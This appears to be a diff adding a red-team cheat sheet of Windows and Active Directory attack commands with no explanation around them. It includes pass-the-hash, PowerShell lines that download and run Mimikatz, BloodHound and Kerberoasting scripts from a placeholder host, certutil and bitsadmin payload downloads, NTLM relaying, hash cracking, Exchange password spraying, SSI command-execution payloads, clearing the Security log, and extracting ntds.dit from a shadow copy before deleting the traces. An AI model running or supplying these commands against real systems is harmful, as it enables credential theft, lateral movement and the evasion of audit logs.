@@ -1,0 +1,67 @@
+sekurlsa::pth /user:username /domain:domain /ntlm:fgsg345345345q345345345
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://ip/help.ps1')"
+
+certutil -urlcache -split -f http://ip/SharpHound.exe sharp.exe
+
+powershell "IEX (New-Object System.Net.Webclient).DownloadString('http://ip/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds"
+
+powershell "IEX (New-Object System.Net.Webclient).DownloadString('http://ip/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -JSONFolder ."
+
+powershell "IEX (New-Object System.Net.Webclient).DownloadString('http://ip/pv.ps1')"
+IEX (New-Object System.Net.Webclient).DownloadString('http://ip/pv.ps1') //To load in the current session
+
+powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://ip/IK.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath .\hash.txt -Width 8000
+
+powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://ip/asre.ps1')
+
+cme smb <CIDR> --gen-relay-list targets.txt
+
+sudo crackmapexec smb 10.1.1.1/24 -u admin -p 'pass123' -M mimikatz
+
+wevtutil cl Security //clearing windows security logs
+
+bitsadmin /create /download testjob
+bitsadmin /addfile testjob http://192.168.1.1/test.exe C:\Users\test\Downloads\test.exe
+bitsadmin /list
+bitsadmin /resume testjob
+bitsadmin /monitor
+bitsadmin /complete testjob
+
+AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata  --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=AC4F8B30 --macdecode --legacy
+
+sudo python2 Responder.py -I eno1 -w -F -b -f -r -P -v --lm
+sudo ntlmrelayx.py -tf targets2.txt
+
+sudo hashcat -m 5600 -a 3 hashes.txt ~/rockyou.txt //Crack NTLMv2-SSP
+sudo hashcat -m 5600 -a 0 hashes.txt ~/rockyou.txt //Crack NTLMv2
+sudo hashcat -m 1000 hashesfile ~/Dictionary  //Crack NTLM hashes (SAM)
+
+xfreerdp /u:testuser /d:workgroup /pth:fgsg345345345q345345345 /v:172.16.6.109
+
+impacket wmiexec.py -hashes :fgsg345345345q345345345 testuser@172.16.6.110
+
+impacket secretsdump.py -hashes :fgsg345345345q345345345 testuser@172.16.6.$i
+
+--- .shtml SSI Payloads ---
+<!--#exec cmd="whoami" -->
+<!--#include file="..\..\web.config" -->
+
+Get-GlobalAddressList -ExchHostname 172.25.50.52 -UserName test\testuser -Password Qwer1234 -OutFile test.txt
+Invoke-PasswordSprayEWS -ExchHostname 172.25.50.52 -UserList .\users2.txt -Password Qwer1234 -Threads 15 -OutFile sprayed.txt
+Invoke-SelfSearch -ExchHostname 172.25.50.52 -Mailbox testuser
+python atomizer.py owa https://172.25.50.52/ 'Qwer1234' ~/Shared/users.txt
+
+http://live.sysinternals.com
+\\live.sysinternals.com\tools\
+
+C:\windows\system32>vssadmin create shadow /for=c:
+mkdir C:\extract
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\extract\ntds.dit
+reg SAVE HKLM\SYSTEM C:\extract\SYS
+vssadmin delete shadows /shadow={b30e1b23-f04e-407a-afb5-fdb62e7d187c} /Quiet
+del C:\extract
+impacket secretsdump.py -ntds ntds.dit -system SYS -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
+
+
+docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp i386/gcc gcc -o test11 test11.c
